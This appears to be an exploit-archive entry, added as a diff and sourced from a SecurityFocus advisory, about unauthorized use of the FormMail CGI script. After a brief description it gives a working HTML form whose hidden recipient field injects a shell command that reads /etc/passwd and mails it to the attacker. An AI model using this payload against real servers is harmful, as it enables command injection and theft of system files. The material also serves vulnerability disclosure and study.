@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/2080/info
+
+FormMail is a widely-used web-based e-mail gateway, which allows form-based input to be emailed to a specified user.
+
+A web server can use a remote site's FormMail script without authorization, using remote system resources or exploiting other vulnerabilities in the script. For example, this issue can be used to exploit BID 2079, "Matt Wright FormMail Remote Command Execution Vulnerability". 
+
+<html><head><title>hack</title></head>
+<body><form method="post" action="http://remote.target.host/cgi-bin/formmail.pl">
+<input type="hidden" name="recipient" value="me@mymail.host; cat /etc/passwd | mail me@mymail.host">
+<input type="submit" name="submit" value="submit">
+</form></body></html> 
